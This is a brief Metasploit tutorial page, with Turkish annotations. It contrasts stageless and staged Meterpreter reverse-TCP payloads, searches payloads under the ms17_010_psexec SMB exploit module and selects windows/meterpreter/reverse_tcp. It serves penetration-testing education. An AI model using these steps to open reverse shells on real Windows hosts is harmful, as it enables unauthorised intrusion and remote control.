# Payloads

## Stageless

```text title="Example"
windows/meterpreter_reverse_tcp
```

* [x] Kararlı.
* [x] Ağ trafiği az.
* [ ] Büyük boyutlu.

## Staged

```text title="Example"
windows/meterpreter/reverse_tcp
```

* [ ] Kararsız.
* [ ] Ağ trafiği fazla.
* [x] Küçük boyutlu.

## Searching for Payloads

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > grep meterpreter grep reverse_tcp show payloads
```

```output title="Output"
   79   payload/windows/meterpreter/reverse_tcp                     .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
   80   payload/windows/meterpreter/reverse_tcp_allports            .                normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
   81   payload/windows/meterpreter/reverse_tcp_dns                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   82   payload/windows/meterpreter/reverse_tcp_rc4                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   83   payload/windows/meterpreter/reverse_tcp_rc4_dns             .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   84   payload/windows/meterpreter/reverse_tcp_uuid                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
   119  payload/windows/patchupmeterpreter/reverse_tcp              .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
   120  payload/windows/patchupmeterpreter/reverse_tcp_allports     .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
   121  payload/windows/patchupmeterpreter/reverse_tcp_dns          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
   122  payload/windows/patchupmeterpreter/reverse_tcp_rc4          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   123  payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns      .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
   124  payload/windows/patchupmeterpreter/reverse_tcp_uuid         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
   241  payload/windows/x64/meterpreter/reverse_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   242  payload/windows/x64/meterpreter/reverse_tcp_rc4             .                normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   243  payload/windows/x64/meterpreter/reverse_tcp_uuid            .                normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
```

## Selecting a Payload

```sh
msf6 exploit(windows/smb/ms17_010_psexec) > set PAYLOAD 79
```

```output title="Output"
PAYLOAD => windows/meterpreter/reverse_tcp
```
